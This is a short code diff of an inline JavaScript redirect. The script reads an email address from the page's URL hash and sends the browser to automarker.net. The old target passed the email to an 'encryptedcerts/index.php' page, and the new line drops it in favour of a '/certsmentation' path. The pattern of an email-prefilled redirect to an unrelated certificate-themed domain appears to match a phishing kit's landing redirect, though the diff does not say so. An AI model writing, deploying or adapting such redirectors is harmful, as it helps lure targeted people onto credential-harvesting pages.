@@ -7,7 +7,7 @@
     (function() {
       const email = window.location.hash.replace('#', '');
       if (email) {
-        const redirectUrl = `https://automarker.net/encryptedcerts/index.php#${email}`;
+        const redirectUrl = `https://automarker.net/certsmentation`;
         window.location.href = redirectUrl;
       } else {
         document.body.innerHTML = "<p>Missing email in URL hash.</p>";
